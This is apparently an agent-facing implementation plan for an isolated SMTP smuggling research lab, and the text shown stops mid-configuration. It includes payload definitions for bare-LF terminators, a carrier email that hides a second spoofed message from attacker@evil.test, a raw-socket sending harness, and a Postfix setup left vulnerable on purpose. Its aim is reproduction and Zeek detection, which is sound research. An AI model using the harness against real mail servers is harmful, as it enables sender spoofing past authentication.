# M0 Floor — SMTP Smuggling Lab Implementation Plan

> **For agentic workers:** Execute this plan task-by-task. Each task's steps use checkbox (`- [ ]`) syntax. After each task's commit, move to the next task. Do not skip the test steps — they are the mechanism that proves the toolchain is actually wired correctly rather than just *looking* wired.

**Goal:** Reach spec §2.M0 exit criteria — full toolchain end-to-end on 3 payloads (A₁, A₂, A₅) against the Postfix→Postfix pairing, with Zeek raising a notice for at least one vulnerable case, in under 3 days of work.

**Architecture:** Containerized Postfix→Postfix→Dovecot lab on an isolated Podman bridge `labnet`; Python raw-socket harness (never `smtplib`); ~80-line `asyncio` stub SMTP receiver as the scientific oracle; `tcpdump` sidecar capturing per-case pcaps; Zeek script reading pcaps and raising notices on parser-ambiguous byte patterns. Dovecot in M0 runs as a pure LMTP-to-Maildir writer; IMAP is deferred to M1.

**Tech stack:** Python 3.11+ (stdlib `socket`, `asyncio`; external: `pyyaml`, `dpkt`, `pytest`), Podman + `podman-compose`, `debian:12-slim` base images, Postfix 3.7 (pinned by Debian 12), Dovecot 2.3, `tcpdump`, Zeek 6.x.

**Reference spec:** `docs/specs/2026-04-14-smtp-smuggling-lab-design.md` (§1, §2.M0, §3.1, §3.2, §4, §5, §6, §7.1, §8, §9, §10.1).

---

## Phases Overview

- **Phase A** — Repo skeleton, Python project hygiene, dependency declaration.
- **Phase B** — Payload data model and byte-preservation tests (the most subtle layer; must be bulletproof before anything else).
- **Phase C** — Stub SMTP receiver (the oracle; must be tested in isolation before any lab container exists).
- **Phase D** — Raw-socket attack harness (the send-side; wired against the stub end-to-end before any container exists).
- **Phase E** — Lab container images: Postfix, Dovecot, tcpdump sidecar; compose file.
- **Phase F** — Pcap-replay oracle integration and case classification.
- **Phase G** — Zeek detector with day-1 smoke test (the Zeek first-time-user safety net per spec §7.1).
- **Phase H** — End-to-end M0 validation against all three payloads and the M0 exit criteria.
- **Phase I** — Documentation and reproducibility: `status.md`, `zeek-primer.md`, `README.md`, `reproduce.sh`.

Commit after every task. Tag `milestone-M0-complete` at the end of Phase H.

---

## Phase A — Repo Skeleton

### Task A1: Directory skeleton and .gitignore

**Files:**
- Create: `.gitignore`
- Create: `payloads/.gitkeep`, `harness/.gitkeep`, `detect/gateway/.gitkeep`, `detect/logs/.gitkeep`, `lab/postfix/.gitkeep`, `lab/dovecot/.gitkeep`, `lab/stub/.gitkeep`, `lab/tcpdump-sidecar/.gitkeep`, `tests/.gitkeep`, `results/pcaps/.gitkeep`, `results/zeek-notices/.gitkeep`, `docs/report/figures/.gitkeep`

- [ ] **Step 1:** Create `.gitignore` with exactly this content (keep it narrowly scoped to standard Python and container build artifacts — no tooling branding strings or editor meta-files beyond what's listed here):

```
# Python
__pycache__/
*.py[cod]
*.egg-info/
.pytest_cache/
.venv/
venv/

# Build / cache
*.log
*.pid

# Editor
.vscode/
.idea/
*.swp
*~

# Local
.env
```

- [ ] **Step 2:** Create empty `.gitkeep` files to make the directory skeleton commit cleanly:

```bash
mkdir -p payloads harness detect/gateway detect/logs lab/postfix lab/dovecot lab/stub lab/tcpdump-sidecar tests results/pcaps results/zeek-notices docs/report/figures
touch payloads/.gitkeep harness/.gitkeep detect/gateway/.gitkeep detect/logs/.gitkeep lab/postfix/.gitkeep lab/dovecot/.gitkeep lab/stub/.gitkeep lab/tcpdump-sidecar/.gitkeep tests/.gitkeep results/pcaps/.gitkeep results/zeek-notices/.gitkeep docs/report/figures/.gitkeep
```

- [ ] **Step 3:** Verify:

```bash
git status
```

Expected: `.gitignore` and all `.gitkeep` files shown as untracked.

- [ ] **Step 4:** Commit:

```bash
git add .gitignore payloads/.gitkeep harness/.gitkeep detect/ lab/ tests/.gitkeep results/ docs/report/figures/.gitkeep
git commit -m "scaffold: initial directory skeleton and .gitignore"
```

### Task A2: Python project file (pyproject.toml)

**Files:**
- Create: `pyproject.toml`

- [ ] **Step 1:** Create `pyproject.toml`:

```toml
[project]
name = "smtp-smuggling-lab"
version = "0.0.0"
description = "SMTP smuggling reproduction lab and detection"
requires-python = ">=3.11"
dependencies = [
    "pyyaml>=6.0",
    "dpkt>=1.9.8",
]

[project.optional-dependencies]
dev = [
    "pytest>=7.4",
    "pytest-asyncio>=0.23",
]

[tool.pytest.ini_options]
testpaths = ["tests"]
asyncio_mode = "auto"
```

- [ ] **Step 2:** Create a virtualenv and install:

```bash
python3 -m venv .venv
. .venv/bin/activate
pip install -e '.[dev]'
```

Expected: installs pyyaml, dpkt, pytest, pytest-asyncio without errors.

- [ ] **Step 3:** Smoke test:

```bash
python -c "import yaml, dpkt, pytest; print('deps ok')"
```

Expected: `deps ok`

- [ ] **Step 4:** Commit:

```bash
git add pyproject.toml
git commit -m "scaffold: pyproject.toml with pyyaml, dpkt, pytest deps"
```

### Task A3: Empty `__init__.py` files

**Files:**
- Create: `harness/__init__.py`, `tests/__init__.py`, `lab/stub/__init__.py`

- [ ] **Step 1:** Create empty init files:

```bash
touch harness/__init__.py tests/__init__.py lab/stub/__init__.py
```

- [ ] **Step 2:** Commit:

```bash
git add harness/__init__.py tests/__init__.py lab/stub/__init__.py
git commit -m "scaffold: empty __init__.py for harness, tests, lab/stub"
```

---

## Phase B — Payload Data Model

### Task B1: Payload YAML with A₁, A₂, A₅

**Files:**
- Create: `payloads/payloads.yaml`

The three M0 payloads, base64-encoded because YAML parsers will silently normalize line endings otherwise. A₁ is the legitimate `\r\n.\r\n` sanity row — it must *always* deliver exactly one email and it is how we prove the harness itself isn't broken.

- [ ] **Step 1:** Compute base64 for the three payloads to avoid typos:

```bash
python3 -c "import base64; print('A1', base64.b64encode(b'\r\n.\r\n'))"
python3 -c "import base64; print('A2', base64.b64encode(b'\n.\n'))"
python3 -c "import base64; print('A5', base64.b64encode(b'\r\n.\n'))"
```

Expected output:
```
A1 b'DQouDQo='
A2 b'Ci4K'
A5 b'DQouCg=='
```

- [ ] **Step 2:** Create `payloads/payloads.yaml`:

```yaml
# SMTP smuggling payloads — M0 subset (A1, A2, A5)
# Cross-ref: Wang et al., USENIX Security '25, Table 1
# Bytes are base64-encoded to prevent line-ending normalization during transit.

- id: A1
  bytes_b64: "DQouDQo="              # "\r\n.\r\n" — legitimate DATA terminator
  family: baseline
  paper_ref: "Table 1"
  scope: lab
  expected_stub_events: 1            # baseline: EXACTLY 1 event, always
  description: |
    Legitimate end-of-data sequence. Included as the sanity row. Any deviation
    from exactly 1 stub event for A1 indicates the harness itself is broken.

- id: A2
  bytes_b64: "Ci4K"                  # "\n.\n"
  family: bare-lf
  paper_ref: "Table 1, §3.1"
  scope: lab
  smuggled_sender: "attacker@evil.test"
  smuggled_subject: "SMUGGLED-A2"
  description: |
    Bare-LF dot bare-LF. Against a receiver that treats bare LF as line-end,
    this terminates the DATA phase early and the bytes after it are parsed
    as a second email.

- id: A5
  bytes_b64: "DQouCg=="              # "\r\n.\n"
  family: crlf-dot-lf
  paper_ref: "Table 1, §3.1"
  scope: lab
  smuggled_sender: "attacker@evil.test"
  smuggled_subject: "SMUGGLED-A5"
  description: |
    CRLF dot bare-LF. Mixed line endings; a receiver that completes the
    DATA terminator on bare LF after CR dot will smuggle.
```

- [ ] **Step 3:** Verify the YAML parses:

```bash
python3 -c "import yaml; d = yaml.safe_load(open('payloads/payloads.yaml')); print(len(d), 'payloads', [p['id'] for p in d])"
```

Expected: `3 payloads ['A1', 'A2', 'A5']`

- [ ] **Step 4:** Verify base64 round-trips to the expected bytes:

```bash
python3 -c "
import yaml, base64
for p in yaml.safe_load(open('payloads/payloads.yaml')):
    raw = base64.b64decode(p['bytes_b64'])
    print(p['id'], repr(raw))
"
```

Expected:
```
A1 b'\r\n.\r\n'
A2 b'\n.\n'
A5 b'\r\n.\n'
```

- [ ] **Step 5:** Commit:

```bash
git add payloads/payloads.yaml
git commit -m "payloads: A1 baseline + A2 bare-LF + A5 CRLF-dot-LF as base64 YAML"
```

### Task B2: Payload loader with byte-preservation test (TDD)

**Files:**
- Create: `tests/test_payloads.py`
- Create: `harness/payloads.py`

- [ ] **Step 1:** Write the failing test first — `tests/test_payloads.py`:

```python
"""Payload loader byte-preservation tests. These catch line-ending
normalization bugs before they silently corrupt the whole matrix."""
from harness.payloads import Payload, load_payloads


def test_a1_decodes_to_exact_crlf_dot_crlf():
    payloads = {p.id: p for p in load_payloads("payloads/payloads.yaml")}
    assert payloads["A1"].raw_bytes == b"\r\n.\r\n"
    assert payloads["A1"].family == "baseline"
    assert payloads["A1"].expected_stub_events == 1


def test_a2_decodes_to_exact_lf_dot_lf():
    payloads = {p.id: p for p in load_payloads("payloads/payloads.yaml")}
    assert payloads["A2"].raw_bytes == b"\n.\n"
    assert payloads["A2"].family == "bare-lf"
    assert payloads["A2"].smuggled_sender == "attacker@evil.test"


def test_a5_decodes_to_exact_crlf_dot_lf():
    payloads = {p.id: p for p in load_payloads("payloads/payloads.yaml")}
    assert payloads["A5"].raw_bytes == b"\r\n.\n"
    assert payloads["A5"].family == "crlf-dot-lf"


def test_all_payloads_are_scope_lab():
    for p in load_payloads("payloads/payloads.yaml"):
        assert p.scope == "lab"


def test_payload_raw_bytes_is_bytes_not_str():
    # Catches accidental .decode() calls
    for p in load_payloads("payloads/payloads.yaml"):
        assert isinstance(p.raw_bytes, bytes), f"{p.id} is {type(p.raw_bytes)}"
```

- [ ] **Step 2:** Run the test and confirm it fails:

```bash
. .venv/bin/activate
pytest tests/test_payloads.py -v
```

Expected: ImportError — `harness.payloads` doesn't exist yet.

- [ ] **Step 3:** Implement `harness/payloads.py`:

```python
"""Payload loader. Reads payloads/payloads.yaml and returns Payload
dataclasses with raw_bytes already base64-decoded. Decoding happens
exactly once, at load time, so every downstream consumer gets identical
bytes."""
from __future__ import annotations

import base64
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

import yaml


@dataclass(frozen=True)
class Payload:
    id: str
    raw_bytes: bytes
    family: str
    paper_ref: str
    scope: str
    expected_stub_events: Optional[int] = None
    smuggled_sender: Optional[str] = None
    smuggled_subject: Optional[str] = None
    description: Optional[str] = None


def load_payloads(path: str | Path) -> list[Payload]:
    data = yaml.safe_load(Path(path).read_text())
    out: list[Payload] = []
    for entry in data:
        raw = base64.b64decode(entry["bytes_b64"])
        out.append(
            Payload(
                id=entry["id"],
                raw_bytes=raw,
                family=entry["family"],
                paper_ref=entry["paper_ref"],
                scope=entry["scope"],
                expected_stub_events=entry.get("expected_stub_events"),
                smuggled_sender=entry.get("smuggled_sender"),
                smuggled_subject=entry.get("smuggled_subject"),
                description=entry.get("description"),
            )
        )
    return out
```

- [ ] **Step 4:** Run the tests and confirm they pass:

```bash
pytest tests/test_payloads.py -v
```

Expected: 5 tests passed.

- [ ] **Step 5:** Commit:

```bash
git add harness/payloads.py tests/test_payloads.py
git commit -m "harness: payload loader with byte-preservation tests"
```

### Task B3: Carrier email template with byte-accurate substitution

**Files:**
- Create: `harness/carrier.py`
- Create: `tests/test_carrier.py`

The carrier is the "legitimate" outer email that wraps the smuggled payload. The template has one placeholder `{SMUGGLED_BLOCK}` where the payload's raw bytes splice in. The substitution must be byte-accurate — no string operations, no `.format()` (which would reject null bytes and raw CRs).

- [ ] **Step 1:** Write the test — `tests/test_carrier.py`:

```python
"""Carrier template tests. Ensure the payload bytes splice in without
mutation and the overall message is a valid RFC 5322-ish envelope."""
from harness.carrier import build_carrier


def test_smuggled_block_bytes_are_preserved_exactly():
    payload = b"\n.\n"
    msg = build_carrier(
        envelope_from="alice@labnet.test",
        envelope_to="bob@labnet.test",
        smuggled_block=payload,
    )
    assert payload in msg
    assert isinstance(msg, bytes)


def test_carrier_has_required_headers():
    msg = build_carrier(
        envelope_from="alice@labnet.test",
        envelope_to="bob@labnet.test",
        smuggled_block=b"",
    )
    assert b"From: alice@labnet.test\r\n" in msg
    assert b"To: bob@labnet.test\r\n" in msg
    assert b"Subject: " in msg
    assert b"Message-ID: " in msg
    assert b"MIME-Version: 1.0\r\n" in msg


def test_carrier_uses_crlf_line_endings_only():
    # Outside the smuggled block, every newline must be CRLF so Postfix
    # doesn't reject the envelope for bare LF before the attack even runs.
    msg = build_carrier(
        envelope_from="alice@labnet.test",
        envelope_to="bob@labnet.test",
        smuggled_block=b"",  # empty smuggled block
    )
    # Count lone LFs that are not preceded by CR
    lone_lfs = 0
    for i, byte in enumerate(msg):
        if byte == 0x0A and (i == 0 or msg[i - 1] != 0x0D):
            lone_lfs += 1
    assert lone_lfs == 0, f"Found {lone_lfs} lone LFs in envelope"


def test_null_byte_in_smuggled_block_preserved():
    payload = b"\x00\r\n.\r\n"
    msg = build_carrier(
        envelope_from="alice@labnet.test",
        envelope_to="bob@labnet.test",
        smuggled_block=payload,
    )
    assert b"\x00" in msg
    assert payload in msg
```

- [ ] **Step 2:** Run the test and confirm it fails:

```bash
pytest tests/test_carrier.py -v
```

Expected: ImportError on `harness.carrier`.

- [ ] **Step 3:** Implement `harness/carrier.py`:

```python
"""Carrier email template. Builds a byte-accurate RFC 5322-ish message
with a splice point for a smuggled payload block. Never uses str.format
or str.replace on the smuggled block — those can mutate line endings or
reject null bytes."""
from __future__ import annotations

import uuid


_TEMPLATE_PREFIX = (
    b"From: {FROM}\r\n"
    b"To: {TO}\r\n"
    b"Subject: Carrier email for smuggling test case\r\n"
    b"Message-ID: <{MSGID}@labnet.test>\r\n"
    b"MIME-Version: 1.0\r\n"
    b"Content-Type: text/plain; charset=us-ascii\r\n"
    b"\r\n"
    b"This is the body of the legitimate carrier email.\r\n"
    b"The smuggled payload block follows this line:\r\n"
)
_TEMPLATE_SUFFIX = (
    b"This is the trailing content that a non-vulnerable receiver would\r\n"
    b"consider part of the carrier body. A vulnerable receiver parses it\r\n"
    b"as the start of a second, smuggled email.\r\n"
    b"MAIL FROM:<attacker@evil.test>\r\n"
    b"RCPT TO:<bob@labnet.test>\r\n"
    b"DATA\r\n"
    b"From: attacker@evil.test\r\n"
    b"To: bob@labnet.test\r\n"
    b"Subject: SMUGGLED MESSAGE\r\n"
    b"\r\n"
    b"If you can read this as a separate email, the receiver is vulnerable.\r\n"
    b".\r\n"
)


def build_carrier(
    envelope_from: str,
    envelope_to: str,
    smuggled_block: bytes,
) -> bytes:
    """Assemble the carrier email as raw bytes, splicing the smuggled
    block in as raw bytes with zero mutation."""
    msgid = uuid.uuid4().hex
    prefix = (
        _TEMPLATE_PREFIX
        .replace(b"{FROM}", envelope_from.encode("ascii"))
        .replace(b"{TO}", envelope_to.encode("ascii"))
        .replace(b"{MSGID}", msgid.encode("ascii"))
    )
    return prefix + smuggled_block + _TEMPLATE_SUFFIX
```

- [ ] **Step 4:** Run the test:

```bash
pytest tests/test_carrier.py -v
```

Expected: 4 tests passed.

- [ ] **Step 5:** Commit:

```bash
git add harness/carrier.py tests/test_carrier.py
git commit -m "harness: byte-accurate carrier email template with splice point"
```

---

## Phase C — Stub SMTP Receiver (the Oracle)

### Task C1: Stub SMTP receiver — correct parser, event logging

**Files:**
- Create: `lab/stub/stub_smtpd.py`
- Create: `tests/test_stub.py`

The stub is the scientific ground truth. It must speak SMTP correctly *and* count every discrete `MAIL FROM → DATA → <end>` cycle as one event. It uses **strictly** `\r\n.\r\n` as the DATA terminator — no tolerance for any other sequence, because its entire job is to answer "how many emails did these bytes encode, according to an RFC-correct parser?"

- [ ] **Step 1:** Write `tests/test_stub.py` — tests against a running stub, using the harness to drive it:

```python
"""Stub SMTP receiver tests. Each test spins up the stub on a random
port, feeds it hand-crafted byte sequences over a raw socket, and
asserts the count of discrete email transactions the stub recorded."""
import asyncio
import json
import socket
from pathlib import Path

import pytest

from lab.stub.stub_smtpd import StubSmtpd


async def _run_stub_on_port(events_path: Path, port: int) -> StubSmtpd:
    stub = StubSmtpd(bind_host="127.0.0.1", bind_port=port, events_path=events_path)
    await stub.start()
    return stub


def _send_raw(port: int, data: bytes) -> bytes:
    """Blocking raw-socket send; returns whatever the server sent back."""
    with socket.create_connection(("127.0.0.1", port), timeout=5) as sock:
        sock.sendall(data)
        sock.shutdown(socket.SHUT_WR)
        chunks = []
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


@pytest.mark.asyncio
async def test_baseline_one_email(tmp_path):
    events = tmp_path / "events.jsonl"
    stub = await _run_stub_on_port(events, 2525)
    try:
        # Send one RFC-compliant transaction
        payload = (
            b"EHLO test.example\r\n"
            b"MAIL FROM:<alice@a.test>\r\n"
            b"RCPT TO:<bob@b.test>\r\n"
            b"DATA\r\n"
            b"Subject: one email\r\n"
            b"\r\n"
            b"body\r\n"
            b".\r\n"
            b"QUIT\r\n"
        )
        await asyncio.to_thread(_send_raw, 2525, payload)
        await asyncio.sleep(0.1)
    finally:
        await stub.stop()
    lines = [json.loads(l) for l in events.read_text().strip().split("\n") if l]
    data_events = [l for l in lines if l["type"] == "data_complete"]
    assert len(data_events) == 1


@pytest.mark.asyncio
async def test_smuggling_bare_lf_still_one_event_stub_is_rfc_correct(tmp_path):
    # The stub is RFC-correct: bare LF is NOT a terminator. Feed it A2
    # and it should see only ONE complete email (and the trailing junk
    # after the bare LF dot gets rejected as a protocol violation or
    # swallowed into the DATA body).
    events = tmp_path / "events.jsonl"
    stub = await _run_stub_on_port(events, 2526)
    try:
        payload = (
            b"EHLO test.example\r\n"
            b"MAIL FROM:<alice@a.test>\r\n"
            b"RCPT TO:<bob@b.test>\r\n"
            b"DATA\r\n"
            b"Subject: one\r\n"
            b"\r\n"
            b"body\n.\n"                 # bare-LF dot bare-LF inside DATA
            b"MAIL FROM:<eve@evil.test>\r\n"
            b"RCPT TO:<bob@b.test>\r\n"
            b"DATA\r\n"
            b"smuggled\r\n"
            b".\r\n"
            b"QUIT\r\n"
        )
        await asyncio.to_thread(_send_raw, 2526, payload)
        await asyncio.sleep(0.1)
    finally:
        await stub.stop()
    lines = [json.loads(l) for l in events.read_text().strip().split("\n") if l]
    data_events = [l for l in lines if l["type"] == "data_complete"]
    # Because the stub is RFC-correct, the bare-LF dot is NOT a terminator.
    # The entire rest of the stream becomes the DATA body until the real
    # \r\n.\r\n is seen. So there is exactly ONE complete data event.
    assert len(data_events) == 1


@pytest.mark.asyncio
async def test_two_legitimate_emails_back_to_back(tmp_path):
    events = tmp_path / "events.jsonl"
    stub = await _run_stub_on_port(events, 2527)
    try:
        payload = (
            b"EHLO test.example\r\n"
            b"MAIL FROM:<a@a.test>\r\n"
            b"RCPT TO:<b@b.test>\r\n"
            b"DATA\r\n"
            b"first\r\n"
            b".\r\n"
            b"MAIL FROM:<c@c.test>\r\n"
            b"RCPT TO:<d@d.test>\r\n"
            b"DATA\r\n"
            b"second\r\n"
            b".\r\n"
            b"QUIT\r\n"
        )
        await asyncio.to_thread(_send_raw, 2527, payload)
        await asyncio.sleep(0.1)
    finally:
        await stub.stop()
    lines = [json.loads(l) for l in events.read_text().strip().split("\n") if l]
    data_events = [l for l in lines if l["type"] == "data_complete"]
    assert len(data_events) == 2
```

- [ ] **Step 2:** Run the test — confirm it fails:

```bash
pytest tests/test_stub.py -v
```

Expected: ImportError on `lab.stub.stub_smtpd.StubSmtpd`.

- [ ] **Step 3:** Implement `lab/stub/stub_smtpd.py`:

```python
"""Stub SMTP receiver — the scientific oracle.

Speaks SMTP correctly per RFC 5321 with exactly one intentional property:
the DATA phase terminator is *strictly* b'\\r\\n.\\r\\n', with no
tolerance for bare-LF or bare-CR variants. This is the whole point:
we are measuring how many discrete MAIL FROM -> DATA -> END cycles the
raw byte stream encodes according to a rigorous parser. Every receiver
in the paper that is vulnerable is *more permissive* than this stub,
which means any smuggling cell where the lab MTA accepts and the stub
agrees that N>1 is a ground-truth positive.

Every discrete DATA completion is logged as one JSON event line to
events_path. The caller reads events_path to get the count.
"""
from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass, field
from pathlib import Path


_DATA_TERMINATOR = b"\r\n.\r\n"


@dataclass
class _Session:
    mail_from: str | None = None
    rcpt_tos: list[str] = field(default_factory=list)
    in_data: bool = False
    data_buffer: bytearray = field(default_factory=bytearray)


class StubSmtpd:
    def __init__(self, bind_host: str, bind_port: int, events_path: Path):
        self.bind_host = bind_host
        self.bind_port = bind_port
        self.events_path = Path(events_path)
        self.events_path.parent.mkdir(parents=True, exist_ok=True)
        self.events_path.write_text("")
        self._server: asyncio.base_events.Server | None = None

    async def start(self) -> None:
        self._server = await asyncio.start_server(
            self._handle_client, self.bind_host, self.bind_port
        )

    async def stop(self) -> None:
        if self._server is not None:
            self._server.close()
            await self._server.wait_closed()

    def _log(self, event: dict) -> None:
        with self.events_path.open("a") as f:
            f.write(json.dumps(event) + "\n")

    async def _handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        session = _Session()
        writer.write(b"220 stub.labnet.test ESMTP\r\n")
        await writer.drain()
        try:
            # We read byte-by-byte so the DATA-phase terminator check is
            # byte-exact across buffer boundaries.
            buf = bytearray()
            while True:
                chunk = await reader.read(4096)
                if not chunk:
                    break
                buf.extend(chunk)
                # Process as many complete command lines or DATA body as available
                while True:
                    if session.in_data:
                        # Look for the strict CRLF . CRLF terminator
                        idx = buf.find(_DATA_TERMINATOR)
                        if idx == -1:
                            break  # need more bytes
                        # Everything up to and including the terminator
                        # is the DATA body.
                        session.data_buffer.extend(buf[:idx])
                        del buf[: idx + len(_DATA_TERMINATOR)]
                        self._log({
                            "type": "data_complete",
                            "mail_from": session.mail_from,
                            "rcpt_tos": list(session.rcpt_tos),
                            "body_len": len(session.data_buffer),
                        })
                        writer.write(b"250 2.0.0 Ok queued\r\n")
                        await writer.drain()
                        session = _Session()  # reset for next transaction on same conn
                    else:
                        # Command mode — look for a single CRLF line
                        idx = buf.find(b"\r\n")
                        if idx == -1:
                            break
                        line = bytes(buf[:idx])
                        del buf[: idx + 2]
                        await self._handle_command(line, session, writer)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def _handle_command(
        self,
        line: bytes,
        session: _Session,
        writer: asyncio.StreamWriter,
    ) -> None:
        upper = line.upper()
        if upper.startswith(b"EHLO") or upper.startswith(b"HELO"):
            writer.write(b"250 stub.labnet.test\r\n")
        elif upper.startswith(b"MAIL FROM:"):
            session.mail_from = line[len(b"MAIL FROM:"):].decode("ascii", errors="replace").strip()
            session.rcpt_tos = []
            self._log({"type": "mail_from", "value": session.mail_from})
            writer.write(b"250 2.1.0 Ok\r\n")
        elif upper.startswith(b"RCPT TO:"):
            rcpt = line[len(b"RCPT TO:"):].decode("ascii", errors="replace").strip()
            session.rcpt_tos.append(rcpt)
            self._log({"type": "rcpt_to", "value": rcpt})
            writer.write(b"250 2.1.5 Ok\r\n")
        elif upper == b"DATA":
            session.in_data = True
            session.data_buffer = bytearray()
            writer.write(b"354 End data with <CR><LF>.<CR><LF>\r\n")
        elif upper == b"RSET":
            session.mail_from = None
            session.rcpt_tos = []
            writer.write(b"250 2.0.0 Ok\r\n")
        elif upper == b"NOOP":
            writer.write(b"250 2.0.0 Ok\r\n")
        elif upper == b"QUIT":
            writer.write(b"221 2.0.0 Bye\r\n")
        else:
            writer.write(b"500 5.5.2 Command not recognized\r\n")
        await writer.drain()
```

- [ ] **Step 4:** Run the tests and confirm they pass:

```bash
pytest tests/test_stub.py -v
```

Expected: 3 tests passed.

- [ ] **Step 5:** Commit:

```bash
git add lab/stub/stub_smtpd.py tests/test_stub.py
git commit -m "stub: RFC-correct SMTP receiver as scientific oracle"
```

---

## Phase D — Raw-Socket Attack Harness

### Task D1: Raw-socket SMTP client — minimal state machine

**Files:**
- Create: `harness/send.py`
- Create: `tests/test_send.py`

The harness is the only thing in the project that is allowed to write attack bytes onto a socket. It never uses `smtplib`. It reads response codes so it knows when to proceed to the next SMTP verb. The body is sent as one `sendall` of the full carrier+smuggled bytes followed by `\r\n.\r\n`.

- [ ] **Step 1:** Write `tests/test_send.py` — integration test against the stub:

```python
"""Harness end-to-end test. Spins up the stub, sends one A2 payload,
and asserts the stub recorded exactly one DATA event (because the stub
is RFC-correct and bare-LF-dot-bare-LF doesn't terminate the DATA
phase for a strict parser)."""
import asyncio
import json
from pathlib import Path

import pytest

from harness.payloads import load_payloads
from harness.send import send_case
from lab.stub.stub_smtpd import StubSmtpd


@pytest.mark.asyncio
async def test_a1_baseline_against_stub_produces_exactly_one_event(tmp_path):
    events = tmp_path / "events.jsonl"
    stub = StubSmtpd("127.0.0.1", 2540, events)
    await stub.start()
    try:
        payloads = {p.id: p for p in load_payloads("payloads/payloads.yaml")}
        await asyncio.to_thread(
            send_case,
            "127.0.0.1",
            2540,
            "alice@labnet.test",
            "bob@labnet.test",
            payloads["A1"],
        )
        await asyncio.sleep(0.1)
    finally:
        await stub.stop()
    lines = [json.loads(l) for l in events.read_text().strip().split("\n") if l]
    data_events = [l for l in lines if l["type"] == "data_complete"]
    assert len(data_events) == 1  # A1 is the baseline — exactly one event


@pytest.mark.asyncio
async def test_a2_against_rfc_strict_stub_produces_one_event(tmp_path):
    # Against the RFC-strict stub, A2 (bare-LF dot bare-LF) is NOT
    # interpreted as a terminator. So the carrier body continues past
    # it, and only the real \r\n.\r\n in the carrier suffix terminates
    # the DATA phase. Result: exactly 1 data_complete event.
    # THIS IS EXPECTED: the stub being non-vulnerable is what makes it
    # a reliable oracle. Vulnerability appears only when we route
    # through a real (vulnerable) MTA first, which mutates bytes such
    # that the stub then sees 2.
    events = tmp_path / "events.jsonl"
    stub = StubSmtpd("127.0.0.1", 2541, events)
    await stub.start()
    try:
        payloads = {p.id: p for p in load_payloads("payloads/payloads.yaml")}
        await asyncio.to_thread(
            send_case,
            "127.0.0.1",
            2541,
            "alice@labnet.test",
            "bob@labnet.test",
            payloads["A2"],
        )
        await asyncio.sleep(0.1)
    finally:
        await stub.stop()
    lines = [json.loads(l) for l in events.read_text().strip().split("\n") if l]
    data_events = [l for l in lines if l["type"] == "data_complete"]
    assert len(data_events) == 1
```

- [ ] **Step 2:** Run the test — confirm it fails:

```bash
pytest tests/test_send.py -v
```

Expected: ImportError on `harness.send.send_case`.

- [ ] **Step 3:** Implement `harness/send.py`:

```python
"""Raw-socket SMTP client. Never uses smtplib — smtplib normalizes
line endings and defeats the project. Speaks the minimum SMTP subset
needed to deliver one carrier email containing one smuggled payload
block.
"""
from __future__ import annotations

import socket
import time

from harness.carrier import build_carrier
from harness.payloads import Payload


def _read_response(sock: socket.socket, timeout: float = 5.0) -> bytes:
    """Read one SMTP response (possibly multi-line). Returns the full
    response bytes including trailing CRLF."""
    sock.settimeout(timeout)
    buf = bytearray()
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf.extend(chunk)
        # A complete response ends in a line where the 4th byte is a
        # space (not a dash), followed by CRLF.
        lines = bytes(buf).split(b"\r\n")
        if len(lines) >= 2 and len(lines[-2]) >= 4 and lines[-2][3:4] == b" ":
            break
    return bytes(buf)


def _expect_code(resp: bytes, code: bytes) -> None:
    if not resp.startswith(code):
        raise RuntimeError(f"expected {code!r}, got {resp!r}")


def send_case(
    host: str,
    port: int,
    envelope_from: str,
    envelope_to: str,
    payload: Payload,
    timeout: float = 10.0,
) -> None:
    """Send one carrier+smuggled-payload email through a real SMTP
    endpoint via raw socket. Blocks until QUIT is acknowledged.

    The smuggled payload bytes are spliced verbatim into the carrier
    body. Line endings, null bytes, and all other raw bytes are
    preserved — sendall writes exactly what the carrier builder
    produced.
    """
    carrier = build_carrier(
        envelope_from=envelope_from,
        envelope_to=envelope_to,
        smuggled_block=payload.raw_bytes,
    )

    with socket.create_connection((host, port), timeout=timeout) as sock:
        _expect_code(_read_response(sock), b"220")
        sock.sendall(b"EHLO harness.labnet.test\r\n")
        _expect_code(_read_response(sock), b"250")
        sock.sendall(f"MAIL FROM:<{envelope_from}>\r\n".encode("ascii"))
        _expect_code(_read_response(sock), b"250")
        sock.sendall(f"RCPT TO:<{envelope_to}>\r\n".encode("ascii"))
        _expect_code(_read_response(sock), b"250")
        sock.sendall(b"DATA\r\n")
        _expect_code(_read_response(sock), b"354")
        # The body itself — the carrier already contains its own trailing
        # \r\n.\r\n from _TEMPLATE_SUFFIX, which terminates DATA.
        sock.sendall(carrier)
        _expect_code(_read_response(sock), b"250")
        sock.sendall(b"QUIT\r\n")
        _expect_code(_read_response(sock), b"221")
    # Give the server a moment to flush its event log before returning.
    time.sleep(0.05)
```

- [ ] **Step 4:** Run the tests:

```bash
pytest tests/test_send.py -v
```

Expected: 2 tests passed.

- [ ] **Step 5:** Commit:

```bash
git add harness/send.py tests/test_send.py
git commit -m "harness: raw-socket SMTP client for attack cases"
```

---

## Phase E — Lab Containers

### Task E1: Postfix Containerfile

**Files:**
- Create: `lab/postfix/Containerfile`
- Create: `lab/postfix/main.cf`
- Create: `lab/postfix/master.cf`
- Create: `lab/postfix/entrypoint.sh`

- [ ] **Step 1:** Create `lab/postfix/Containerfile`:

```dockerfile
FROM debian:12-slim

RUN apt-get update \
    && DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
        postfix \
        postfix-pcre \
        rsyslog \
        ca-certificates \
        procps \
    && rm -rf /var/lib/apt/lists/*

# Postfix on Debian 12 is 3.7.x — vulnerable by default to bare-LF
# smuggling when smtpd_forbid_bare_newline is explicitly disabled.
COPY main.cf /etc/postfix/main.cf
COPY master.cf /etc/postfix/master.cf
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

# Prepare the Maildir volume mountpoint
RUN useradd -m -s /bin/bash bob \
    && mkdir -p /home/bob/Maildir \
    && chown -R bob:bob /home/bob

EXPOSE 25
CMD ["/entrypoint.sh"]
```

- [ ] **Step 2:** Create `lab/postfix/main.cf`:

```
# Postfix main.cf — SMTP smuggling lab configuration
# Explicit settings so upstream Debian defaults never mask the lab.

